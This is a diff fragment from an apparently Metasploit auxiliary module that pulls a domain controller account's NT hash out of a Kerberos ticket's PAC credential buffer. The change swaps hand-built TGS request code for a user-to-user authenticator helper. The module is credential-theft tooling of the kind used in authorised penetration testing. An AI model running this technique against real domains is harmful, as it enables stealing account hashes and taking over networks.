@@ -382,78 +382,25 @@ class MetasploitModule < Msf::Auxiliary
     dc_name += '$' unless dc_name.ends_with?('$')
     print_status("Trying to retrieve NT hash for #{dc_name}")
 
-    realm = datastore['DOMAIN'].upcase
+    realm = datastore['DOMAIN'].downcase
 
-    sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
-      name_type: Rex::Proto::Kerberos::Model::NameType::NT_UNKNOWN,
-      name_string: [ dc_name ]
+    authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(
+      host: rhost,
+      realm: realm,
+      username: dc_name,
+      framework: framework,
+      framework_module: self
     )
+    tgs_ticket, _tgs_auth = authenticator.u2uself(credential)
 
-    now = Time.now.utc
-    expiry_time = now + 1.day
-
-    ticket_options = Rex::Proto::Kerberos::Model::KerberosFlags.from_flags(
-      [
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::FORWARDABLE,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::RENEWABLE,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::CANONICALIZE,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::ENC_TKT_IN_SKEY,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::RENEWABLE_OK,
-      ]
-    )
-
-    ticket = Rex::Proto::Kerberos::Model::Ticket.decode(credential.ticket.value)
     session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
       type: credential.keyblock.enctype.value,
       value: credential.keyblock.data.value
     )
-
-    tgs_res = send_request_tgs(
-      req: build_tgs_request(
-        {
-          session_key: session_key,
-          subkey: nil,
-          checksum: nil,
-          ticket: ticket,
-          realm: realm,
-          client_name: dc_name,
-
-          body: build_tgs_request_body(
-            cname: nil,
-            sname: sname,
-            realm: realm,
-            etype: [ticket.enc_part.etype],
-            options: ticket_options,
-
-            # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
-            from: nil,
-            till: expiry_time,
-            rtime: nil,
-
-            # certificate time
-            ctime: now,
-
-            additional_tickets: [ticket]
-          )
-        }
-      ),
-      rport: 88
+    ticket_enc_part = Rex::Proto::Kerberos::Model::TicketEncPart.decode(
+      tgs_ticket.enc_part.decrypt_asn1(session_key.value, Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET)
     )
-
-    # Verify error codes
-    if tgs_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
-      raise ::Rex::Proto::Kerberos::Model::Error::KerberosError.new(res: tgs_res)
-    end
-
-    print_good("#{peer} - Received a valid TGS-Response")
-
-    enc_tgs_ticket = tgs_res.ticket.enc_part.decrypt_asn1(
-      session_key.value,
-      Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET
-    )
-
-    tgs_ticket = Rex::Proto::Kerberos::Model::TicketEncPart.decode(enc_tgs_ticket)
-    value = OpenSSL::ASN1.decode(tgs_ticket.authorization_data.elements[0][:data]).value[0].value[1].value[0].value
+    value = OpenSSL::ASN1.decode(ticket_enc_part.authorization_data.elements[0][:data]).value[0].value[1].value[0].value
     pac = Rex::Proto::Kerberos::Pac::Krb5Pac.read(value)
     pac_info_buffer = pac.pac_info_buffers.find do |buffer|
       buffer.ul_type == Rex::Proto::Kerberos::Pac::Krb5PacElementType::CREDENTIAL_INFORMATION
